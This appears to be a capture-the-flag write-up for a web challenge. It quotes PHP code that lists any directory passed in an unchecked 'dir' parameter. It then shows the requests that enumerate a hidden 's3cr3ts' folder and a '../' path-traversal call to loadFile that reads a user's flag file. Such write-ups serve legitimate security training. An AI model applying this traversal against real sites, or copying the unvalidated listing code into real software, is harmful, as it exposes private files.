# Mission 3 ~ page walking


## Goal and instructions

Can you [render](https://web3.chall.necst.it/) the flag of user `Marcie`? Hint: can you retrieve the source code?


## Web app structure

The website is a rendering platform that allows chess pieces to be viewed in detail and realistically from all angles.


## Code overview

The source code for the page was not provided directly, but it can be viewed using the browser's development tools. Once you inspect the page, you can see that there is a `list_model_options` function, which shows the files in a directory.
```php
function list_model_options($directory)
{
    // Open the directory and read its contents
    $dir_handle = opendir($directory);
    while (false !== ($file = readdir($dir_handle))) {
        // Skip current and parent directories
        if ($file == “.” || $file == “..”) {
            continue;
        }
        // Print the file name
        $file_no_ext = str_replace(“.obj”, “”, $file);
        echo “<option value=‘$file_no_ext’>” . $file_no_ext . “</option>”;
    
    }
    // Close the directory handle
    closedir($dir_handle);
}

$dir = $_GET['dir'];
if(isset($dir) && !is_null($dir)){
    list_model_options($dir);
}
```

If you look closely at the code shown above, you will see that you can also view all the directories on the site:
```php
$dir = $_GET['dir'];
if(isset($dir) && !is_null($dir)){
    list_model_options($dir);
}
```
This code checks if the `dir` parameter is set and is not null, and then calls the `list_model_options` function to list the contents of the specified directory.


## Solution

To complete the exploit, you need to follow the following steps:

1. Figure out what site directories are
   ```https
   https://web4.chall.necst.it/listModelOptions.php?dir=./
   ```
   These are the directory of the site:
   - listModelOptions.php
   - s3cr3ts
   - index.php
   - js
   - loadModel.php
     
3. Print the names of all users in the drop-down menu
   ```https
   https://web4.chall.necst.it/index.php?dir=./s3cr3ts
   ```
   ```https
   https://web4.chall.necst.it/index.php?dir=./s3cr3ts/Marcie
   ```
5. Copy the *.txt* file that appears along with all the previously printed names.
   
7. Open the site again and do loadFile of the previously found *.txt* file
   - Add a breakpoint in loadFile function
   - In the console call the function
     ```javascript
     loadFile("../s3cr3ts/Marcie/7ade7249188a95075e8b5b0020a09d72.txt")
     ```

